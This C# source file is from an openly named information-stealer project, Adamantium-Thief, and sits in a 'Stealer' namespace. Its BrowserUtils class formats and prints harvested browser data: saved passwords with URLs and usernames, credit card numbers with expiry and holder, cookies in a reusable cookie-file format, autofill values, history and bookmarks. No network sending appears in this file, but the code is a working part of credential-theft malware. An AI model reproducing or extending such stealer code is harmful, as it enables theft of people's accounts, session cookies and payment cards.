/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;
using System.Collections.Generic;
using static Stealer.Common;

namespace Stealer
{
    internal sealed class BrowserUtils
    {
        private static string FormatPassword(Password password)
        {
            return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n",
                password.hostname, password.username, password.password);
        }
        private static string FormatCreditCard(CreditCard cc)
        {
            return String.Format("Number: {0}\nExp: {1}\nHolder: {2}\n\n",
                cc.number, cc.expmonth + "/" + cc.expyear, cc.name);
        }
        private static string FormatCookie(Cookie cookie)
        {
            return String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n",
                cookie.hostname, cookie.path, cookie.expiresutc, cookie.name, cookie.value);
        }
        private static string FormatAutoFill(AutoFill autofill)
        {
            return String.Format("{0}\t\n{1}\t\n\n", autofill.name, autofill.value);
        }
        private static string FormatHistory(Site history)
        {
            return String.Format("### {0} ### \"{1}\", Visits: {2}, Date: {3}\n", history.title, history.hostname, history.visits, history.date);
        }
        private static string FormatBookmark(Bookmark bookmark)
        {
            return String.Format("### {0} ### \"{1}\", Added ({2})\n", bookmark.title, bookmark.hostname, bookmark.added);
        }

        public static bool ShowCookies(List<Cookie> Cookies)
        {
            try
            {
                foreach (Cookie Cookie in Cookies)
                    Console.WriteLine(FormatCookie(Cookie));

                return true;
            }
            catch { return false; }
        }

        public static bool ShowAutoFill(List<AutoFill> Autofills)
        {
            try
            {
                foreach (AutoFill Autofill in Autofills)
                    Console.WriteLine(FormatAutoFill(Autofill));

                return true;
            }
            catch { return false; }
        }

        public static bool ShowHistory(List<Site> HistoryItems)
        {
            try
            {
                foreach (Site History in HistoryItems)
                    Console.WriteLine(FormatHistory(History));

                return true;
            }
            catch { return false; }
        }

        public static bool ShowBookmarks(List<Bookmark> Bookmarks)
        {
            try
            {
                foreach (Bookmark Bookmark in Bookmarks)
                    Console.WriteLine(FormatBookmark(Bookmark));

                return true;
            }
            catch { return false; }
        }

        public static bool ShowPasswords(List<Password> Passwords)
        {
            try
            {
                foreach (Password Password in Passwords)
                {

                    if (Password.username == "" || Password.password == "")
                        continue;
                    Console.WriteLine(FormatPassword(Password));
                }

                return true;
            }
            catch { return false; }
        }

        public static bool ShowCreditCards(List<CreditCard> CreditCards)
        {
            try
            {
                foreach (CreditCard CreditCard in CreditCards)
                    Console.WriteLine(FormatCreditCard(CreditCard));

                return true;
            }
            catch { return false; }
        }

    }
}
